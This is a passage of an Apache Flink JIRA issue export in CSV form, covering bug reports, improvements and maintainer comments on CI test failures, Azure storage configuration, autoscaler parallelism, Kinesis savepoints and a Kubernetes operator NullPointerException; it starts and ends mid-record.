 ",,,,,,,,,,,,,,,,,,FLINK-32121,,,INFRA-24607,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sat May 20 17:37:29 UTC 2023,,,,,,,,,,"0|z1hyog:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"18/May/23 02:39;tanyuxin;[~pgaref] Thanks for reporting this, I will take a look at this issue.;;;","18/May/23 03:49;pgaref;[~tanyuxin]  I already opened a  PR and tests passed [https://github.com/apache/flink/pull/22603]  – just need a +1 :) 
Please reassign to me;;;","18/May/23 05:43;tanyuxin;OK, The jira has something wrong and can not link it dynamically. So I didn't notice the PR. I have reassigned it to you.;;;","18/May/23 05:48;pgaref;Thanks much [~tanyuxin] !;;;","18/May/23 06:09;dmvk;> Lets switch to  [https://downloads.apache.org|https://downloads.apache.org/] mirror

The problem with this approach is that it only provides the latest minor version of N major versions, so it will start failing any time Kafka folks do a new minor release.;;;","18/May/23 06:12;dmvk;I'm opening a ticket with INFRA; the proper solution should be fixing the archive on their side;;;","18/May/23 06:51;dmvk;[https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49102&view=logs&j=af184cdd-c6d8-5084-0b69-7e9c67b35f7a&t=0f3adb59-eefa-51c6-2858-3654d9e0749d#:~:text=%5BFAIL%5D%20%27Avro%20Confluent%20Schema%20Registry]

 

https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49103&view=logs&j=af184cdd-c6d8-5084-0b69-7e9c67b35f7a&t=0f3adb59-eefa-51c6-2858-3654d9e0749d&l=3804;;;","18/May/23 10:27;dmvk;master: 8c3637b47f3dd906694857cd1b808139599126fa

 

The change should be reverted once  INFRA-24607 is addressed.;;;","20/May/23 17:37;Weijie Guo;Reverted in master(1.18) via f32052a12309cfe38f66344cf6d4ab39717e44c8 as INFRA-24607 was addressed.;;;",,,,,,,,,,,,,,
Update the Azure Blob Storage document to assist in configuring the MSI provider with a shaded class name,FLINK-32122,13536609,,Improvement,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,,surendralilhore,surendralilhore,17/May/23 18:25,31/Aug/23 04:46,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Connectors / FileSystem,Documentation,,,0,pull-request-available,,,"Many users have reported on the mailing list that they are unable to configure the ABFS filesystem as a checkpoint directory. This is often due to ClassNotFoundException errors for Hadoop classes that are configured in the configuration value. For instance, when using MsiTokenProvider for ABFS storage in Flink, it should be configured with the shaded class name. However, many users mistakenly use the Hadoop class name or package instead.

 

fs.azure.account.oauth.provider.type: *org.apache.flink.fs.shaded.hadoop3.org.apache.hadoop.fs.azurebfs.oauth2.MsiTokenProvider*",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-17 18:25:13.0,,,,,,,,,,"0|z1hyns:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Avro Confluent Schema Registry nightly end-to-end test failed due to timeout,FLINK-32121,13536554,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Blocker,Duplicate,,Wencong Liu,Wencong Liu,17/May/23 12:16,18/May/23 06:51,04/Jun/24 20:41,18/May/23 06:51,1.18.0,,,,,,,,,,,,,,,,,,,,Build System / CI,Connectors / Kafka,,,0,test-stability,,,"[https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49102&view=logs&j=af184cdd-c6d8-5084-0b69-7e9c67b35f7a&t=0f3adb59-eefa-51c6-2858-3654d9e0749d#:~:text=%5BFAIL%5D%20%27Avro%20Confluent%20Schema%20Registry]

 

 ",,,,,,,,,,,,,,,,,,,,FLINK-32123,,,,,,,,,,,,"17/May/23 12:15;Wencong Liu;temp1.jpg;https://issues.apache.org/jira/secure/attachment/13058292/temp1.jpg","17/May/23 12:15;Wencong Liu;temp2.jpg;https://issues.apache.org/jira/secure/attachment/13058293/temp2.jpg",,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu May 18 02:46:50 UTC 2023,,,,,,,,,,"0|z1hybk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"17/May/23 12:19;tanyuxin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49103&view=logs&j=af184cdd-c6d8-5084-0b69-7e9c67b35f7a&t=0f3adb59-eefa-51c6-2858-3654d9e0749d&l=3804;;;","18/May/23 02:46;tanyuxin;This looks like the duplicated issue with https://issues.apache.org/jira/browse/FLINK-32123;;;",,,,,,,,,,,,,,,,,,,,,
Add autoscaler config option to disable parallelism key group alignment,FLINK-32120,13536549,,Improvement,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,mxm,mxm,mxm,17/May/23 11:51,14/Mar/24 14:33,04/Jun/24 20:41,,,,,,,,,,,,,,,,kubernetes-operator-1.9.0,,,,,,Autoscaler,Kubernetes Operator,,,0,,,,"After choosing the target parallelism for a vertex, we choose a higher parallelism if that parallelism leads to evenly spreading the number of key groups. The number of key groups is derived from the max parallelism.

The amount of actual skew we would introduce if we did not do the alignment would usually be pretty low. In fact, the data itself can have an uneven load distribution across the keys (hot keys). In this case, the key group alignment is not effective.

For experiments, we should allow disabling the key group alignment via a configuration option.",,,,,,,,,,,,,,,,,,,,,,,,,,,,FLINK-32119,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-17 11:51:55.0,,,,,,,,,,"0|z1hyag:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Revise source partition skew logic ,FLINK-32119,13536548,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,mxm,mxm,mxm,17/May/23 11:46,14/Mar/24 14:33,04/Jun/24 20:41,,,,,,,,,,,,,,,,kubernetes-operator-1.9.0,,,,,,Autoscaler,Kubernetes Operator,,,0,,,,"After choosing the target parallelism for a vertex, we choose a higher parallelism if that parallelism leads to evenly spreading the number of key groups (=max parallelism).

Sources don't have keyed state, so this adjustment does not make sense for key groups. However, we internally limit the max parallelism of sources to the number of partitions discovered. This prevents partition skew. 

The partition skew logic currently doesn’t work correctly when there are multiple topics because we use the total number of partitions discovered. Using a single max parallelism doesn’t yield skew free partition distribution then. However, this is also true for a single topic when the number of partitions is a prime number or a not easily divisible number. 

Hence, we should add an option to guarantee skew free partition distribution which means using the total number of partitions when another configuration is not possible. 

",,,,,,,,,,,,,,,,,,,,FLINK-32124,,,,,,FLINK-32120,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu May 18 06:32:45 UTC 2023,,,,,,,,,,"0|z1hya8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"17/May/23 12:06;gyfora;If we disable this we can still have problems when the data consumed by the sources is uneven. Lets say you have 8 partitions and you set parallelism 5, in that case you will have 3 source instances consuming 2 partitions and 2 instances consuming 1 partition which would introduce a data/IO skew at the source.

This should also be configurable probably, and I am not even sure whether default should be off;;;","17/May/23 14:03;mxm;True, partition skew is probably worse than key group misalignment. In that light, we probably want to rethink the current code which tolerates skewness for sources in case it can't reach an even balance.;;;","18/May/23 06:32;Zhanghao Chen;+1 for ""partition skew is probably worse than key group misalignment"", and key group misalignment is not even a problem for non-key-based operations. I think we'd better add two different options to control partition balance for sources and key group alignment for other operators separately. ;;;",,,,,,,,,,,,,,,,,,,,
Support customized listener during task manager startup,FLINK-32118,13536544,13417633,Sub-task,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,zjureel,zjureel,17/May/23 11:38,17/May/23 11:38,04/Jun/24 20:41,,1.18.0,,,,,,,,,,,,,,,,,,,,Runtime / Task,,,,0,,,,"Add a listener in TaskManager and do some customized operations during TaskManager startup, such as initialization of disks and networks for storage",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-17 11:38:21.0,,,,,,,,,,"0|z1hy9c:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add more test for update statement,FLINK-32117,13536520,,Improvement,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,luoyuxia,luoyuxia,17/May/23 09:30,17/May/23 09:30,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Table SQL / API,,,,0,,,,"From the [comment|https://github.com/apache/flink/pull/22525#pullrequestreview-1430138819] of the pr for fixing FLINK-32001.

we need to more tests to cover more cases  for update statement so that we can fidn before user reported like FLINK-32001.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-17 09:30:58.0,,,,,,,,,,"0|z1hy40:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
FlinkKinesisConsumer cannot stop-with-savepoint when configured with watermark assigner and watermark tracker,FLINK-32116,13536513,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,a.pilipenko,liangtl,liangtl,17/May/23 08:58,16/Apr/24 10:33,04/Jun/24 20:41,,1.15.4,1.16.1,aws-connector-4.2.0,aws-connector-4.3.0,,,,,,,,,,,aws-connector-4.4.0,,,,,,Connectors / Kinesis,,,,0,,,,"Problem:

When FlinkKinesisConsumer is configured with legacy watermarking system, it is unable to take a savepoint during stop-with-savepoint, and will get stuck indefinitely.

 

 
{code:java}
FlinkKinesisConsumer src = new FlinkKinesisConsumer(""YourStreamHere"", new SimpleStringSchema(), consumerConfig);
// Set up watermark assigner on Kinesis source
src.setPeriodicWatermarkAssigner(...);
// Set up watermark tracker on Kinesis source
src.setWatermarkTracker(...);{code}
 

 

*Why does it get stuck?*

When watermarks are setup, the `shardConsumer` and `recordEmitter` thread communicate using asynchronous queue.

On stop-with-savepoint, shardConsumer waits for queue to empty before continuing. recordEmitter is terminated before queue is empty. As such, queue is never going to be empty, and app gets stuck indefinitely.

 

*Workarounds*

Use the new watermark framework
{code:java}
FlinkKinesisConsumer src = new FlinkKinesisConsumer(""YourStreamHere"", new SimpleStringSchema(), consumerConfig);
env.addSource(src)
// Set up watermark strategy with both watermark assigner and watermark tracker
    .assignTimestampsAndWatermarks(WatermarkStrategy.forMonotonousTimestamps()){code}
 

 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-17 08:58:33.0,,,,,,,,,,"0|z1hy2g:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
json_value support cache,FLINK-32115,13536487,,Improvement,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,zhoujira86,zhoujira86,17/May/23 03:40,24/May/23 02:02,04/Jun/24 20:41,,1.16.1,,,,,,,,,,,,,,,,,,,,Table SQL / Runtime,,,,0,,,,"+underlined text+[https://github.com/apache/hive/blob/storage-branch-2.3/ql/src/java/org/apache/hadoop/hive/ql/udf/generic/GenericUDTFJSONTuple.java]

 

hive support json object cache for previous deserialized value, could we consider use a cache objects in JsonValueCallGen? 

 

This optimize can improve performance of SQL like

 

select 

json_value(A, 'xxx'),

json_value(A, 'yyy'),

json_value(A, 'zzz'),

...

a lot

 

I added a static LRU cache into SqlJsonUtils, and refactor the jsonValueExpression1 like 
{code:java}
private static JsonValueContext jsonValueExpression1(String input) {
    JsonValueContext parsedJsonContext = EXTRACT_OBJECT_CACHE.get(input);
    if (parsedJsonContext != null) {
        return parsedJsonContext;
    }
    try {
        parsedJsonContext = JsonValueContext.withJavaObj(dejsonize(input));
    } catch (Exception e) {
        parsedJsonContext = JsonValueContext.withException(e);
    }

    EXTRACT_OBJECT_CACHE.put(input, parsedJsonContext);
    return parsedJsonContext;
} {code}
 

and benchmarked like:
{code:java}
public static void main(String[] args) {
String input = ""{\""social\"":[{\""weibo\"":\""https://weibo.com/xiaoming\""},{\""github\"":\""https://github.com/xiaoming\""}]}"";

Long start = System.currentTimeMillis();
for (int i = 0; i < 1000000; i++) {
Object dejsonize = jsonValueExpression1(input);
}
System.err.println(System.currentTimeMillis() - start);

} {code}
 

time 2 benchmark takes is:
||case||milli second taken||
|cache|33|
|no cache|1591|

 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-17 03:40:38.0,,,,,,,,,,"0|z1hxwo:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Make FailureEnricherContext more flexible and include task specific fields,FLINK-32114,13536484,13529017,Sub-task,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,wangm92,pgaref,pgaref,17/May/23 03:26,19/Sep/23 06:02,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,,,,,0,,,,"On task failures, context would be nice to include extra fields like taskName, location, etc.
Discussion under: [https://github.com/apache/flink/pull/22506#discussion_r1195408929]

We may need to provide more information about the error to the enrichers, e.g. related task. Such information can be decided only after an error occurs. So maybe a more flexible way is to create a new context for each failure dynamically, i.e. create from {{{}failedExecution }} in \{{{}handleFailure (){}}}.

[https://github.com/apache/flink/pull/22506#discussion_r1195539179]

Introduce {{FailureEnricherContextFactory}} and {{DummyFailureEnricherContextFactory}}
{{https://github.com/apache/flink/pull/22506#discussion_r1197573074}}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Sep 19 05:53:00 UTC 2023,,,,,,,,,,"0|z1hxw0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"19/Sep/23 03:46;wangm92;[~pgaref] hi, If you haven't started doing this yet, I'd like to take this;;;","19/Sep/23 05:53;pgaref;Sure [~wangm92]  – please go ahead;;;",,,,,,,,,,,,,,,,,,,,,
TtlMapStateAllEntriesTestContext failure in generic types,FLINK-32113,13536442,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,,mapohl,mapohl,16/May/23 17:19,02/Apr/24 10:42,04/Jun/24 20:41,,1.18.0,,,,,,,,,,,,,,,,,,,,Tests,,,,0,auto-deprioritized-major,test-stability,,"I have the same test failure in both e2e test runs:

[https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49076&view=logs&j=af184cdd-c6d8-5084-0b69-7e9c67b35f7a&t=160c9ae5-96fd-516e-1c91-deb81f59292a&l=2924]

[https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49076&view=logs&j=bea52777-eaf8-5663-8482-18fbc3630e81&t=b2642e3a-5b86-574d-4c8a-f7e2842bfb14&l=2924]
{code:java}
16:36:27.471 [ERROR] /home/vsts/work/1/s/flink-runtime/src/test/java/org/apache/flink/runtime/state/ttl/TtlMapStateAllEntriesTestContext.java:[49,30] incompatible types: inference variable T0 has incompatible bounds
    equality constraints: java.lang.String,java.lang.Integer,UK,T0,T0
    lower bounds: java.lang.Integer
[...]
16:36:27.495 [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.8.0:testCompile (default-testCompile) on project flink-runtime: Compilation failure
16:36:27.495 [ERROR] /home/vsts/work/1/s/flink-runtime/src/test/java/org/apache/flink/runtime/state/ttl/TtlMapStateAllEntriesTestContext.java:[49,30] incompatible types: inference variable T0 has incompatible bounds
16:36:27.496 [ERROR]     equality constraints: java.lang.String,java.lang.Integer,UK,T0,T0
16:36:27.496 [ERROR]     lower bounds: java.lang.Integer
16:36:27.496 [ERROR] -> [Help 1] {code}",,,,,,,,,,,,,,,,,,,,,,,,,,FLINK-23982,,FLINK-34963,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Aug 18 22:35:07 UTC 2023,,,,,,,,,,"0|z1hxmo:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"16/May/23 17:20;mapohl;Similar error was reported in FLINK-23982.;;;","10/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issues has been marked as Major but is unassigned and neither itself nor its Sub-Tasks have been updated for 60 days. I have gone ahead and added a ""stale-major"" to the issue"". If this ticket is a Major, please either assign yourself or give an update. Afterwards, please remove the label or in 7 days the issue will be deprioritized.
;;;","18/Aug/23 22:35;flink-jira-bot;This issue was labeled ""stale-major"" 7 days ago and has not received any updates so it is being deprioritized. If this ticket is actually Major, please raise the priority and ask a committer to assign you the issue or revive the public discussion.
;;;",,,,,,,,,,,,,,,,,,,,
 Fix the deprecated state backend sample config in Chinese document,FLINK-32112,13536427,,Improvement,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Critical,Fixed,xmzhou,xmzhou,xmzhou,16/May/23 15:46,19/May/23 08:04,04/Jun/24 20:41,19/May/23 07:59,1.17.0,,,,,,,,,,,,,,1.17.1,1.18.0,,,,,Documentation,,,,0,,,,"Current Version Avaliable State Backends :
 * _HashMapStateBackend_
 * _EmbeddedRocksDBStateBackend_

 

_But in the Operations/State & Fault Tolerance page of flink v1.17.0,_ _a sample section in the configuration set state.backend: filesystem  in zh-doc._

_The correct configuration should be:_

  _state.backend: hashmap_

 

_I think it may cause misunderstandings for users._",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/May/23 15:46;xmzhou;Snipaste_2023-05-16_23-45-02.jpg;https://issues.apache.org/jira/secure/attachment/13058270/Snipaste_2023-05-16_23-45-02.jpg","16/May/23 15:46;xmzhou;Snipaste_2023-05-16_23-45-47.jpg;https://issues.apache.org/jira/secure/attachment/13058269/Snipaste_2023-05-16_23-45-47.jpg",,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri May 19 08:04:56 UTC 2023,,,,,,,,,,"0|z1hxjc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"17/May/23 03:26;Wencong Liu;Helllo [~xmzhou] , Thanks for your proposal. Currently, the config ""state.backend: filesystem"" is deprecated and it will be replaced by ""state.backend: hashmap"", the detailed logic is in here [[code|https://github.com/apache/flink/blob/4bd51ce122d03a13cfd6fdf69325630679cd5053/flink-runtime/src/main/java/org/apache/flink/runtime/state/StateBackendLoader.java#L143]]. If the user set ""state.backend: filesystem"", an error will be thrown. The Chinese doc should be updated.;;;","17/May/23 03:56;xmzhou;Hi [~Wencong Liu]  ,Thank you for your reply. I have made changes to the document and created a Pull request.

The Pull request Address: [PR|https://github.com/apache/flink/pull/22596];;;","18/May/23 05:27;xmzhou;Hi,[~Wencong Liu] . I'm very sorry for closing the [PR|https://github.com/apache/flink/pull/22596] due to my mistake.  Now I created a new [PR|https://github.com/apache/flink/pull/22605] to merge this commit to branch 1.17-release.;;;","19/May/23 07:59;Weijie Guo;master(1.18) via ab5af14361f0f40db095e5ac0634c1491d4d033f.
release-1.17 via 2256327c505b36be9f78ab8363806eec0c69d215.;;;","19/May/23 08:04;Weijie Guo;[~xmzhou] Please note that fix typo like this does not require opening a ticket, It is more suitable to directly push a hotfix PR.;;;",,,,,,,,,,,,,,,,,,
Replacing cluster in failed state with a new one failed,FLINK-32111,13536420,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,tamirsagi,tamirsagi,tamirsagi,16/May/23 15:07,15/Jun/23 11:40,04/Jun/24 20:41,19/May/23 15:43,kubernetes-operator-1.5.0,kubernetes-operator-1.6.0,,,,,,,,,,,,,kubernetes-operator-1.6.0,,,,,,Kubernetes Operator,,,,0,,,,"I deployed a problematic cluster(HA enabled with 3 JMs) to check cluster updates process. The cluster was in restart loops. Then I provided a newer CRD (Updated several configurations) and expected the cluster to get re-deployed. however the following exception happened

 

Caused by: java.lang.NullPointerException
        at org.apache.flink.kubernetes.operator.service.CheckpointHistoryWrapper.getInProgressCheckpoint(CheckpointHistoryWrapper.java:60) 
        at org.apache.flink.kubernetes.operator.service.AbstractFlinkService.getCheckpointInfo(AbstractFlinkService.java:564) 
        at org.apache.flink.kubernetes.operator.service.AbstractFlinkService.getLastCheckpoint(AbstractFlinkService.java:520) 
        at org.apache.flink.kubernetes.operator.observer.SavepointObserver.observeLatestSavepoint(SavepointObserver.java:209) 
        at org.apache.flink.kubernetes.operator.observer.SavepointObserver.observeSavepointStatus(SavepointObserver.java:73) 
        at org.apache.flink.kubernetes.operator.observer.deployment.ApplicationObserver.observeFlinkCluster(ApplicationObserver.java:61) 
        at org.apache.flink.kubernetes.operator.observer.deployment.AbstractFlinkDeploymentObserver.observeInternal(AbstractFlinkDeploymentObserver.java:73) 
        at org.apache.flink.kubernetes.operator.observer.AbstractFlinkResourceObserver.observe(AbstractFlinkResourceObserver.java:53) 
        at org.apache.flink.kubernetes.operator.controller.FlinkDeploymentController.reconcile(FlinkDeploymentController.java:134) 

 

upgradeMode was first `last-state` and then I changed it to `stateless` but it still did not deploy the new cluster.",,,,,,,,,,,,,,,,,,FLINK-32340,,,,,,,,,,,,,,"16/May/23 15:07;tamirsagi;operator-error.txt;https://issues.apache.org/jira/secure/attachment/13058262/operator-error.txt",,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri May 19 15:43:43 UTC 2023,,,,,,,,,,"0|z1hxhs:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"16/May/23 15:10;gyfora;I have seen this issue once in the past, could be that some strange data was returned by the flink rest api resulting in a null somewhere in the response. We should add a null check in the logic.;;;","16/May/23 15:11;gyfora;[~tamirsagi] would you be interested in providing a simple fix for this?;;;","17/May/23 07:58;tamirsagi;sure,

I already created MR.

[https://github.com/apache/flink-kubernetes-operator/pull/603|https://github.com/apache/flink-kubernetes-operator/pull/603/commits]

I tested it locally, it worked.;;;","19/May/23 15:43;gyfora;merged to main c531b3701a5e1e7ea51d37143979c27f1c88f78f;;;",,,,,,,,,,,,,,,,,,,
TM native memory leak when using time window in Pyflink ThreadMode,FLINK-32110,13536413,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,yunjunluo,yunjunluo,yunjunluo,16/May/23 14:06,25/May/23 09:50,04/Jun/24 20:41,25/May/23 09:50,1.17.0,,,,,,,,,,,,,,1.17.2,,,,,,API / Python,,,,0,,,,"If job use time window in Pyflink thread mode, TM native memory will grow slowly during the job running until TM can't allocate memory from operate system.

The leak rate is likely proportional to the number of key.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu May 25 09:50:49 UTC 2023,,,,,,,,,,"0|z1hxg8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"25/May/23 09:50;hxb;Merged into master via 2f015eb899feb6e60a379a33baab442f93f17ca2

Merged into release-1.17 11ccc44b1e7beacc198a78cdc75be6294840a74b;;;",,,,,,,,,,,,,,,,,,,,,,
Operator doesn't recognize JobManager stuck on volumeMount startup errors,FLINK-32109,13536407,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Won't Fix,,gyfora,gyfora,16/May/23 13:04,30/May/23 06:56,04/Jun/24 20:41,30/May/23 06:56,kubernetes-operator-1.5.0,kubernetes-operator-1.6.0,,,,,,,,,,,,,,,,,,,Kubernetes Operator,,,,0,,,,"Currently the flink deployment observer logic only reacts to Deployment conditions such as failure to create the JM pod, image pull errors etc.

Pod startup errors such as volumeMount are not recognized as errors and the operator keeps waiting for it indefintitely.

This is a tricky problem because volumeMount errors can be transient and are only reported as Events for the pod so I am not completely sure if we can do anything about this. ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue May 16 17:18:19 UTC 2023,,,,,,,,,,"0|z1hxew:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"16/May/23 13:04;gyfora;cc [~mbalassi] [~thw] ;;;","16/May/23 17:18;thw;[~gyfora] if the issue can be corrected externally and eventually the deployment can transition into running state w/o intelligence in the operator then it is probably best to just wait? What would be useful though is to bubble up the event to the flinkdeployment level. Similar to genuine errors that we already interpret this would require special logic to recognize the specific condition. That needs to be added on a best effort basis and I think that is OK since it is mostly for convenience (saving the client to dig into the lower level resources).;;;",,,,,,,,,,,,,,,,,,,,,
KubernetesExtension calls assumeThat in @BeforeAll callback which doesn't print the actual failure message,FLINK-32108,13536387,,Technical Debt,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,,mapohl,mapohl,16/May/23 09:18,31/Oct/23 03:16,04/Jun/24 20:41,,1.18.0,,,,,,,,,,,,,,,,,,,,Test Infrastructure,,,,0,pull-request-available,starter,,"{{KubernetesExtension}} implements {{BeforeAllCallback}} which calls the {{assumeThat}} in the {{@BeforeAll}} context. {{assumeThat}} doesn't work properly in the {{@BeforeAll}} context, though: The error message is not printed and the test fails with exit code -1.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Oct/23 06:05;victoryu930909;image-2023-10-30-14-05-27-154.png;https://issues.apache.org/jira/secure/attachment/13063969/image-2023-10-30-14-05-27-154.png",,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-16 09:18:53.0,,,,,,,,,,"0|z1hxag:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Kubernetes test failed because ofunable to establish ssl connection to github on AZP,FLINK-32107,13536368,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,victoryu930909,Sergey Nuyanzin,Sergey Nuyanzin,16/May/23 07:28,02/Nov/23 01:04,04/Jun/24 20:41,01/Nov/23 12:45,1.17.1,1.18.0,,,,,,,,,,,,,1.17.2,1.18.1,1.19.0,,,,Tests,,,,0,pull-request-available,starter,test-stability,"on AZP kubernetes test fails https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49022&view=logs&j=bea52777-eaf8-5663-8482-18fbc3630e81&t=43ba8ce7-ebbf-57cd-9163-444305d74117&l=4884
as
{noformat}
2023-05-16T03:54:54.4652330Z May 16 03:54:54 
2023-05-16T03:54:54.4652942Z May 16 03:54:54 [FAIL] 'Run Kubernetes test' failed after 5 minutes and 37 seconds! Test exited with exit code 1
2023-05-16T03:54:54.4653363Z May 16 03:54:54 
{noformat}
in logs
{noformat}
